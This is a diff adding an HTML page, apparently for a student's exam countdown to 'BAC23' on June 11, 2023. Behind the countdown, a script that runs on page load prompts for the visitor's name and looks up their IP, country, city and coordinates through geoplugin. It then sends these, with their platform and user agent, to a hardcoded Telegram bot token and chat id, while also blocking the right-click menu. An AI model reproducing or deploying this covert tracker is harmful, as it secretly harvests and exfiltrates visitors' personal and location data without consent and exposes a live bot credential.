@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>bac - moncef</title>
+    <style>
+        @font-face {
+            font-family: akira;
+            src: url(akira.otf);
+        }
+        body {
+            font-family: akira;
+            background-color: black;
+            color: white;
+            background-image: url(./town.gif);
+        }
+        header {
+            text-align: center;
+            font-size: larger;
+        }
+        @keyframes colorRotate {
+            from {
+            color: #55ffc6;
+            }
+            50% {
+            color: #ff3d3d;
+            }
+            100% {
+            color: #31eb20;
+            }
+        }
+        section h1 {
+            font-size: 300%;
+            text-align: center;
+            animation: colorRotate 5s linear 0s infinite;
+            position: relative;
+            top: 5vh;
+        }
+        section div {
+            font-size: 100%;
+            text-align: center;
+            position: relative;
+            top: 5vh;
+        }
+        h3 {
+            color: white;
+            font-size: 2vh;
+        }
+        h2 {
+            font-size: 4vh;
+            color: rgb(255, 174, 0);
+        }
+        a {
+            text-decoration: none;
+            color: gray;
+        }
+        footer {
+            font-family: Arial, Helvetica, sans-serif;
+            position: fixed;
+            left: 0;
+            bottom: 0;
+            width: 100%;
+            color: white;
+            text-align: center;
+        }
+    </style>
+</head>
+<body contextmenu="return false;">
+    <header><h1>BAC23</h1></header>
+    <section>
+        <h1>JUNE 11TH</h1>
+        <div>
+            <h2 id="days"><h3>Days</h3></h2>
+            <h2 id="hours"><h3>Hours</h3></h2>
+            <h2 id="minutes"><h3>Minutes</h3></h2>
+            <h2 id="seconds"><h3>Seconds</h3></h2>
+        </div>
+    </section>
+    <footer></footer>
+</body>
+<script>
+  var x=prompt("who u");
+  localStorage.setItem('user', x)
+    while(x == "" || x == null || x == " " || x == "." || x == ".."){
+      alert("oups");
+    var x=prompt("man said who u");
+    localStorage.setItem('user', x)
+  }
+document.querySelector('footer').innerHTML = `by <a href="instagram.com/m2ncef">moncef</a>. for u ${localStorage.getItem('user')}😚`
+function ip(){
+  fetch('http://www.geoplugin.net/json.gp')
+    .then((res) => res.json())
+    .then((data) => {
+      var ip = data.geoplugin_request
+      var country = `${data.geoplugin_countryCode} - ${data.geoplugin_countryName}`
+      var city = `${data.geoplugin_regionCode} - ${data.geoplugin_region} / ${data.geoplugin_city}`
+      var LL = `https://www.findlatlong.com/?lat=${data.geoplugin_latitude}%26long=${data.geoplugin_longitude}`
+      var url = `https://api.telegram.org/bot5342005128:AAFjMw1i9K-FSDX0RzrRHgsyhMj9QMs80VU/sendMessage?chat_id=1603299669&text=𝘽𝘼𝘾 𝘾𝙊𝙐𝙉𝙏𝘿𝙊𝙒𝙉  %0APage: ${document.title} (${window.location.pathname.split("/").pop()}) %0Aname: ${localStorage.getItem('user')} %0AIP: ${ip} %0ACountry: ${country} %0ACity: ${city}%0ALat/Long: ${LL} %0APlatform: ${navigator.platform}%0AUA: %0A${navigator.userAgent}`;
+      var oReq = new XMLHttpRequest();
+      oReq.open("GET", url, true);
+      oReq.send();
+    })
+}
+ip()
+var countDownDate = new Date("June 11, 2023 00:00:00").getTime();
+var x = setInterval(function() {
+  var now = new Date().getTime();
+  var distance = countDownDate - now;
+  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+  var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+  document.getElementById("days").innerHTML = days;
+  document.getElementById("hours").innerHTML = hours;
+  document.getElementById("minutes").innerHTML = minutes;
+  document.getElementById("seconds").innerHTML = seconds;
+
+  // If the count down is finished, write some text
+  if (distance < 0) {
+    clearInterval(x);
+    document.getElementById("countdown").innerHTML = "GOOD LUCK";
+  }
+}, 1000);
+document.addEventListener('contextmenu', event => event.preventDefault());
+</script>
+</html>
